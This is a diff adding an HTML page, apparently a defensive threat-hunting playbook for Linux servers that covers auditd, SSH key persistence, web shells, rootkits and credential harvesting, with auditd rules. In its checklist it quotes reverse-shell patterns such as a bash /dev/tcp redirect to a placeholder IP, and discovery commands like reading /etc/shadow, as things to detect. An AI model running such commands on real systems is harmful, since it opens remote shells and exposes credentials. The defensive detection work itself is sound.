@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>[TONK] Playbook: Linux Server Fleet</title>
+<style>
+  :root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--text:#e6edf3;--text2:#8b949e;--text3:#6e7681;--border:#30363d;--border2:#444c56;--accent:#58a6ff;--accent2:#1f6feb;--red:#f85149;--green:#3fb950;--amber:#d29922;--purple:#bc8cff;--mono:'SFMono-Regular','Consolas','Liberation Mono','Menlo',monospace;--sans:-apple-system,'Segoe UI','Helvetica Neue',Arial,sans-serif}
+  *{margin:0;padding:0;box-sizing:border-box}body{font-family:var(--sans);background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column}a{color:var(--accent);text-decoration:none}a:hover{text-decoration:underline}
+  header{display:flex;align-items:center;gap:14px;padding:10px 20px;border-bottom:1px solid var(--border);background:var(--bg2);flex-wrap:wrap}.logo{font-family:var(--mono);font-size:14px;font-weight:700;color:var(--text2);white-space:nowrap}.logo span{font-weight:400;color:var(--text3)}.site-switcher{display:flex;gap:4px}.switcher-side{font-family:var(--mono);font-size:11px;font-weight:600;padding:4px 10px;border-radius:4px;color:var(--text3);text-decoration:none;letter-spacing:.03em;transition:background .15s}.switcher-side:hover{background:var(--bg3);text-decoration:none}.switcher-side.active{background:var(--red);color:#fff}.back-link{font-family:var(--mono);font-size:11px;color:var(--text3);margin-left:auto;text-decoration:none}.back-link:hover{color:var(--text2);text-decoration:none}
+  .pb-hero{background:var(--bg2);border-bottom:1px solid var(--border);padding:36px 20px;text-align:center}.pb-pill-lg{display:inline-block;font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.1em;padding:4px 12px;border-radius:4px;margin-bottom:14px;color:var(--accent);border:1px solid rgba(88,166,255,.4);background:rgba(88,166,255,.08)}.pb-title{font-family:var(--mono);font-size:22px;font-weight:700;color:var(--text);margin-bottom:8px}.pb-sub{font-size:13px;color:var(--text3);max-width:640px;margin:0 auto;line-height:1.6}.pb-meta-row{font-family:var(--mono);font-size:10px;color:var(--text3);margin-top:12px;letter-spacing:.04em}
+  .content{max-width:820px;margin:0 auto;padding:28px 20px 40px}.section-head{font-family:var(--mono);font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin:32px 0 14px;padding-bottom:8px;border-bottom:1px solid var(--border)}.section-head:first-child{margin-top:0}.section-head.red{color:var(--red)}.section-head.amber{color:var(--amber)}.section-head.blue{color:var(--accent)}.section-head.green{color:var(--green)}.section-head.default{color:var(--text3)}
+  .prose{font-size:13px;color:var(--text2);line-height:1.75;margin-bottom:16px}.prose strong{color:var(--text);font-weight:600}
+  .check-list{list-style:none;margin:0 0 20px;padding:0}.check-list li{position:relative;padding:12px 14px 12px 36px;margin-bottom:8px;background:var(--bg2);border:1px solid var(--border);border-radius:6px;font-size:12px;color:var(--text2);line-height:1.65}.check-list li::before{content:'';position:absolute;left:12px;top:15px;width:14px;height:14px;border:2px solid var(--border2);border-radius:3px}.check-list li strong{color:var(--text);display:block;margin-bottom:2px;font-size:13px}.check-list li .ref{font-family:var(--mono);font-size:10px;color:var(--accent);margin-top:6px;display:block}
+  .note-box{background:var(--bg2);border:1px solid var(--border);border-left:3px solid var(--amber);border-radius:6px;padding:14px 16px;margin:20px 0;font-size:12px;color:var(--text2);line-height:1.65}.note-box strong{color:var(--amber)}.note-box.red{border-left-color:var(--red)}.note-box.red strong{color:var(--red)}
+  .tool-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:20px}@media(max-width:600px){.tool-grid{grid-template-columns:1fr}}.tool-card{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:12px 14px}.tool-card .tc-name{font-family:var(--mono);font-size:11px;font-weight:700;color:var(--green);margin-bottom:4px}.tool-card .tc-desc{font-size:11px;color:var(--text3);line-height:1.5}
+  .seq-block{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:16px;margin:12px 0 20px;font-family:var(--mono);font-size:11px;color:var(--text2);line-height:2}.seq-block .seq-cmd{color:var(--text);background:var(--bg3);padding:2px 6px;border-radius:3px}.seq-block .seq-label{color:var(--text3);font-size:10px;display:block;margin-top:8px;margin-bottom:4px;text-transform:uppercase;letter-spacing:.06em}
+  footer{margin-top:auto;padding:22px 20px;border-top:1px solid var(--border);background:var(--bg2);text-align:center}footer p{font-family:var(--mono);font-size:10px;color:var(--text3);margin:0;letter-spacing:.04em}
+</style>
+</head>
+<body>
+<header>
+  <a href="/playbooks/" class="logo" style="text-decoration:none">TONK<span> &bull; playbooks</span></a>
+  <div class="site-switcher"><a class="switcher-side" href="/net/">NET</a><a class="switcher-side" href="/host/">HOST</a><a class="switcher-side" href="/attribution/">ATTRIB</a><span class="switcher-side active">PLAYBOOKS</span></div>
+  <a href="/playbooks/" class="back-link">&larr; all playbooks</a>
+</header>
+
+<div class="pb-hero">
+  <div class="pb-pill-lg">ENVIRONMENT</div>
+  <div class="pb-title">Linux Server Fleet</div>
+  <div class="pb-sub">Web servers, databases, containers, CI/CD, jump boxes. The servers that run everything but get hunted last. No Sysmon, no GPO, no Event Log. Detection here is auditd, journalctl, file integrity, and knowing what's supposed to be running.</div>
+  <div class="pb-meta-row">RHEL / Ubuntu / Debian &middot; auditd + journald &middot; SSH-centric access &middot; container-aware</div>
+</div>
+
+<div class="content">
+
+<div class="section-head red">Why Linux gets overlooked</div>
+
+<p class="prose">
+  Most detection engineering is Windows-first. Sysmon, Windows Event Logs, GPO, Group Policy, and Active Directory provide a deep telemetry surface that doesn't exist on Linux. The result: <strong>Linux servers in enterprise environments often have minimal monitoring</strong>, basic syslog at best, and no host-based detection rules. Attackers know this.
+</p>
+<p class="prose">
+  Linux servers are high-value targets precisely because they run critical services: web applications, databases, DNS, email, CI/CD pipelines, container orchestration, and jump boxes for network access. A compromised Linux web server gives the attacker a foothold inside the perimeter. A compromised CI/CD server gives them supply chain access. A compromised jump box gives them credentials to everything the admin can reach.
+</p>
+
+<div class="note-box">
+  <strong>The telemetry gap.</strong> If your detection coverage is Sysmon + Windows Event Logs + EDR, your Linux servers are effectively unmonitored. The playbook below assumes you have auditd configured (or can configure it now) and access to journald/syslog. If you have neither, your first step is deploying auditd with a detection-focused ruleset (Florian Roth's Linux auditd rules are a good baseline).
+</div>
+
+<div class="section-head amber">Key detection sources (what you have to work with)</div>
+
+<div class="tool-grid">
+  <div class="tool-card">
+    <div class="tc-name">auditd</div>
+    <div class="tc-desc">Kernel-level syscall auditing. The closest Linux equivalent to Sysmon. Monitor execve (command execution), file access on sensitive paths, network socket creation, and kernel module loading. The primary detection source.</div>
+  </div>
+  <div class="tool-card">
+    <div class="tc-name">journald / syslog</div>
+    <div class="tc-desc">System and service logs. SSH authentication (auth.log/secure), cron execution, systemd service state changes, and application-specific logging. Less granular than auditd but broadly available.</div>
+  </div>
+  <div class="tool-card">
+    <div class="tc-name">osquery</div>
+    <div class="tc-desc">SQL-based host inspection. Scheduled queries against processes, open ports, file hashes, kernel modules, cron jobs, and authorized_keys. Excellent for fleet-wide baselining and drift detection.</div>
+  </div>
+  <div class="tool-card">
+    <div class="tc-name">File Integrity Monitoring</div>
+    <div class="tc-desc">AIDE, Tripwire, osquery FIM, or inotify watches on critical paths. Detects unauthorized changes to /etc/passwd, /etc/shadow, SSH configs, cron directories, and systemd unit files.</div>
+  </div>
+</div>
+
+<div class="section-head blue">Hunt checklist: Linux server fleet</div>
+
+<ol class="check-list">
+  <li>
+    <strong>1. Audit SSH authorized_keys across all hosts</strong>
+    The #1 Linux persistence mechanism. Attackers add their public key to ~/.ssh/authorized_keys or /root/.ssh/authorized_keys for passwordless re-entry. Diff current authorized_keys files against a known-good baseline. Any key you can't attribute to a known admin is unauthorized access. Also check /etc/ssh/sshd_config for AuthorizedKeysFile pointing to non-standard locations.
+    <span class="ref"><a href="/host/persistence.html#T1098.004">HOST: T1098.004</a> SSH Keys &middot; auditd: watch /root/.ssh/ and /home/*/.ssh/</span>
+  </li>
+  <li>
+    <strong>2. Check for unauthorized cron jobs and systemd services</strong>
+    Enumerate all cron entries: /var/spool/cron/*, /etc/cron.d/*, /etc/crontab, and per-user crontabs. Enumerate all systemd units: compare <code>systemctl list-unit-files</code> against package manager records (<code>rpm -qf</code> or <code>dpkg -S</code>). Any cron entry or systemd unit not owned by an installed package is suspicious.
+    <span class="ref"><a href="/host/persistence.html#T1053.003">HOST: T1053.003</a> Cron &middot; <a href="/host/persistence.html#T1543.002">T1543.002</a> Systemd</span>
+  </li>
+  <li>
+    <strong>3. Hunt for web shells in web server directories</strong>
+    Search document roots (/var/www/, application deployment paths) for: recently created PHP/JSP/ASPX files, files containing eval/exec/system/passthru, files with obfuscated content (base64, gzip, hex encoding), and files with modification timestamps that don't match deployment records. China Chopper is a common web shell across Chinese APTs.
+    <span class="ref"><a href="/host/persistence.html">HOST: Persistence</a> &middot; find /var/www -name "*.php" -newer /var/www/index.html</span>
+  </li>
+  <li>
+    <strong>4. Check for rootkit indicators</strong>
+    APT28's Drovorub and other Linux rootkits hide at the kernel level. Check for: discrepancies between <code>lsmod</code> and <code>/sys/module/</code> (hidden modules), processes visible in /proc but not in <code>ps</code> output, open network ports not shown by <code>ss</code>/<code>netstat</code>, and files visible with <code>ls</code> but not <code>find</code> (or vice versa). Volatility's linux_check_modules is the gold standard for rootkit detection.
+    <span class="ref"><a href="/host/persistence.html#T1547.006">HOST: T1547.006</a> Kernel Module &middot; <a href="/playbooks/actors/apt28.html">APT28</a> Drovorub</span>
+  </li>
+  <li>
+    <strong>5. Review process execution for discovery bursts</strong>
+    The Linux LOTL discovery sequence: <code>id</code>, <code>uname -a</code>, <code>cat /etc/passwd</code>, <code>ss -tunlp</code>, <code>find / -name authorized_keys</code>, <code>cat /etc/shadow</code>. These are normal admin commands individually. Six of them in 30 seconds from a service account that normally runs a web server is the anomaly. Auditd execve logging catches this.
+    <span class="ref"><a href="/host/discovery.html">HOST: Discovery</a> &middot; <a href="/playbooks/triage/lotl.html">LOTL</a> playbook &middot; auditd execve</span>
+  </li>
+  <li>
+    <strong>6. Check for credential harvesting</strong>
+    On Linux: /etc/shadow access by non-root processes, SSH private key reads from ~/.ssh/id_*, history file reads (bash_history, .mysql_history), and credential files in application configs (database connection strings, API keys in .env files). Auditd watches on these paths catch harvesting attempts.
+    <span class="ref"><a href="/host/credential_access.html#T1003.008">HOST: T1003.008</a> /etc/shadow &middot; <a href="/host/credential_access.html#T1552.004">T1552.004</a> SSH Keys</span>
+  </li>
+  <li>
+    <strong>7. Audit network connections for unexpected outbound traffic</strong>
+    Linux servers should have predictable network behavior. A database server doesn't make outbound HTTP requests. A web server doesn't initiate SSH connections to external IPs. Map expected outbound connections per server role and alert on deviations. <code>ss -tunp</code> with process context shows which process owns each connection.
+    <span class="ref">NET: <a href="/net/c2.html">C2</a> &middot; Zeek conn.log &middot; ss -tunp baseline</span>
+  </li>
+  <li>
+    <strong>8. Check for container escape and orchestrator compromise</strong>
+    If you run Docker/Kubernetes: check for containers running as privileged, pods with hostPID/hostNetwork, new ClusterRoleBindings granting cluster-admin, unauthorized kubectl exec sessions, and container images pulled from untrusted registries. Container escape to the host node is a privilege escalation path that bypasses host-level controls.
+    <span class="ref"><a href="/host/privilege_escalation.html">HOST: Privilege Escalation</a> &middot; K8s audit logs &middot; Docker daemon logs</span>
+  </li>
+  <li>
+    <strong>9. Review package manager and binary integrity</strong>
+    Verify installed packages against repository signatures: <code>rpm -Va</code> (RHEL) or <code>debsums</code> (Debian/Ubuntu). Any binary that fails verification has been modified since installation. Also check for binaries in writable paths (/tmp, /dev/shm, /var/tmp) that shouldn't contain executables, and for LD_PRELOAD hijacking (check /etc/ld.so.preload and the environment variable).
+    <span class="ref"><a href="/host/defense_evasion.html">HOST: Defense Evasion</a> &middot; rpm -Va &middot; debsums --changed</span>
+  </li>
+  <li>
+    <strong>10. Check for reverse shells and bind shells</strong>
+    Search for: bash/python/perl/netcat processes with network connections to external IPs, processes with stdin/stdout/stderr redirected to network sockets (look at /proc/PID/fd/), and listening services on unexpected ports. Common reverse shell patterns: <code>bash -i >& /dev/tcp/IP/PORT</code>, <code>python -c 'import socket,subprocess,os'</code>, and ncat/socat listeners.
+    <span class="ref"><a href="/host/execution.html">HOST: Execution</a> &middot; auditd: execve + socket creation &middot; ss -tlnp for unexpected listeners</span>
+  </li>
+</ol>
+
+<div class="section-head green">Auditd rules to deploy now</div>
+
+<p class="prose">If you have no auditd rules, these are the minimum for detection coverage. Deploy these before you start hunting.</p>
+
+<div class="seq-block">
+  <span class="seq-label">Credential access</span>
+  <span class="seq-cmd">-w /etc/shadow -p r -k shadow_read</span><br>
+  <span class="seq-cmd">-w /etc/passwd -p wa -k passwd_mod</span><br>
+  <span class="seq-cmd">-w /etc/sudoers -p wa -k sudoers_mod</span>
+</div>
+
+<div class="seq-block">
+  <span class="seq-label">SSH persistence</span>
+  <span class="seq-cmd">-w /root/.ssh/ -p wa -k ssh_root</span><br>
+  <span class="seq-cmd">-w /home/ -p wa -k ssh_user</span>
+</div>
+
+<div class="seq-block">
+  <span class="seq-label">Persistence mechanisms</span>
+  <span class="seq-cmd">-w /etc/cron.d/ -p wa -k cron_persist</span><br>
+  <span class="seq-cmd">-w /etc/systemd/system/ -p wa -k systemd_persist</span><br>
+  <span class="seq-cmd">-w /etc/ld.so.preload -p wa -k ldpreload</span>
+</div>
+
+<div class="seq-block">
+  <span class="seq-label">Kernel module loading</span>
+  <span class="seq-cmd">-w /sbin/insmod -p x -k kernel_mod</span><br>
+  <span class="seq-cmd">-w /sbin/modprobe -p x -k kernel_mod</span>
+</div>
+
+<div class="section-head default">Actors who target Linux</div>
+
+<p class="prose">
+  <strong><a href="/playbooks/actors/apt28.html">APT28</a></strong> deployed the Drovorub Linux rootkit (kernel module + userland agent). NSA/FBI joint advisory with detection guidance.<br>
+  <strong><a href="/playbooks/actors/apt41.html">APT41</a></strong> operates KEYPLUG cross-platform (Windows + Linux). Uses systemd persistence with spoofed daemon names and targets Linux build servers for supply chain access.<br>
+  <strong><a href="/playbooks/actors/lazarus.html">Lazarus</a></strong> runs cross-platform implants (AppleJeus on macOS/Linux). Targets developer workstations and CI/CD infrastructure.<br>
+  <strong><a href="/playbooks/actors/sandworm.html">Sandworm</a></strong> deployed AcidPour/AcidRain Linux wipers against embedded systems and routers, and uses Linux-targeted wiper scripts (RSHRED, SOLOSHRED, AWFULSHRED) alongside Industroyer deployments.
+</p>
+
+</div>
+<footer><p>TONK &middot; Threat Observation &amp; Network Kill-chain</p><p style="margin-top:8px">built by <a href="https://6b74.dev" style="color:var(--accent)">KT</a></p></footer>
+</body>
+</html>
